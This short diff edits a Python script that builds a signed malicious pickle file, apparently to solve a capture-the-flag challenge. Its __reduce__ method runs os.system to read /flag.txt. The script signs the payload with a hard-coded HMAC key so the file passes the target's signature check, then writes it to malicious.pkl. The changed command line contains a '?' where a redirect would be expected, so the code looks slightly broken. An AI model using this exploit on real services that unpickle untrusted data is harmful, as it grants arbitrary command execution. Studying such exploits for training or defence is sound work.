@@ -4,12 +4,13 @@ import pickle, os, hashlib, hmac
 
 class RCE:
     def __reduce__(self):
-        return (os.system, ("cat /flag.txt",))
+        return (os.system, ("cat /flag.txt ? /tmp/hacked.txt",))
 
+SECRET_KEY = "pickle_tickle"
 payload = pickle.dumps(RCE())
-sig = hmac.new(b"pickle_tickle", payload, hashlib.sha256).hexdigest()
+sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()
 
 with open("malicious.pkl", "wb") as f:
     f.write(payload)
 
-print(f"Signature: {sig}")
+print(f"HMAC signature: {sig}")
